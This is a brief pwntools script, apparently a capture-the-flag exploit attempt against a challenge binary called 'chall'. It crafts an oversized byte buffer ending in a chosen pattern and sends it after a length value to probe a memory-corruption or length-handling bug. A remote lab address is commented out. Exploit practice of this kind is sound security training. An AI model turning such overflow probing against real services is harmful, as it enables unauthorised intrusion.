from pwn import *
from itertools import combinations
import string

read_size = 0x814

input = bytes([i for i in range(256)])
input += b"0xff"

while len(input) < read_size:
    input += input


pattern = b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9"
pattern = bytes([i for i in range(0x9c, 0x9c+ 0x12)])

input = input[:read_size-1] + pattern

read_size = read_size + len(pattern)

# p = gdb.debug("./chall", '''
# b *chall +405
# ''')
p = process("./chall")
# p = remote("10.90.189.81", 6000)

p.sendline(str(read_size))

#p.sendline(input[:read_size-1] + pattern)
p.sendline(input)

print("")
print(read_size, len(input), input[-6:])
p.recv()
p.interactive()